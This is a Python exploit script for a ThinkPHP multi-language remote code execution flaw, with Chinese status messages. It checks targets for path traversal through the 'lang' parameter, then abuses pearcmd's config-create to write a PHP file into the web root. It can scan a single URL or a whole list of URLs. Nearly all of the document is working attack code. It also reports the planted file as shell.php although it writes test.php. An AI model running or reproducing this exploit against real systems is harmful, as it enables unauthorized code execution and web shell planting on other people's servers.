# -*- coding: utf-8 -*-
# @Time    : 2022/12/14 12:24
# @Author  : CHOSEN1-Z13
# @FileName: thinkphp-think-lang-rce.py
# @Software: PyCharm

import requests
import optparse
from bs4 import BeautifulSoup
from urllib.parse import urlparse


headers = {
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Cookie': 'think_lang=zh-cn' ,
            'Connection': 'close'
}


def POC_one(turl):
    url=turl+"/index.php?lang=../../../../../public/index"

    req=requests.get(url=url,headers=headers)
    try:
       if req.status_code==500:#如果漏洞存在，则服务器会出错，返回500页面。
            print(turl + '------存在漏洞')
            url=turl+'/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/+/var/www/html/test.php'
            re = requests.session()
            re = requests.get(url, headers=headers)
            html = re.text
            if 'Successfully created default configuration file' in html:
              print(turl+'------存在漏洞,写入成功,位置:{}/shell.php'.format(turl))
            else:
                print(turl+'------写入失败，请手工尝试')
       else:
            print(turl+'------不存在漏洞')
    except:
       print(turl+'访问失败')
def POC_two(file):
    payload="/index.php?lang=../../../../../public/index"
    payload_two='/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/+/var/www/html/test.php'
    with open(file,'r') as f:
        list=f.readlines()
        for url in list:
            url=url.split('\n')[0]
            taget=url+payload
            try:
                req = requests.get(url=taget, headers=headers)
                if req.status_code == 500:
                    print(url + '------存在漏洞')
                    taget_two=url+payload_two
                    re = requests.session()
                    re = requests.get(taget_two, headers=headers)
                    html=re.text
                    if 'Successfully created default configuration file' in html:
                        print(url + '------存在漏洞,写入成功,位置:{}/shell.php'.format(url))
                    else:
                        print(url + '------写入失败，请手工尝试')

                else:
                    print(url + '------不存在漏洞')
            except:
                print(url+'------访问失败')


def main():
    parse=optparse.OptionParser()
    parse.add_option('-u','--url',dest='url',help='请输入url',type=str)
    parse.add_option('-f', '--file', dest='file', help='请输入文件路径', type=str)
    options,args=parse.parse_args()
    if options.url != None and options.file == None:
        POC_one(options.url)
    if options.url == None and options.file != None:
        POC_two(options.file)

if __name__ == '__main__':
    print('''      =========================================

           Thinkphp 多语言 RCE  by CHOSEN1-Z13
      
      ========================================= ''')
    main()
